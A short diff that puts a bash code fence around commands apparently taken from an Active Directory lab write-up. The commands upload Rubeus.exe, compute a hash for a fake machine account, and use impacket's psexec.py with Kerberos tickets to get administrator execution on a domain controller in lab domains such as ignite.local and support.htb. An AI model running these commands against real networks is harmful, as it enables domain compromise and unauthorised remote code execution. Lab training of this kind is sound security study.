@@ -1,3 +1,4 @@
+```bash
 upload /home/kali/Downloads/Rubeus.exe r.exe
 
 ./r.exe hash /domain:ignite.local /user:fake01 /password:123456
@@ -54,5 +55,5 @@ sudo /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass support.htb/
 
 psexec.py -k -no-pass ignite.local/administrator@dc1.ignite.local -dc-ip 192.168.1.2 -target-ip 192.168.1.2
 
-
+```
 
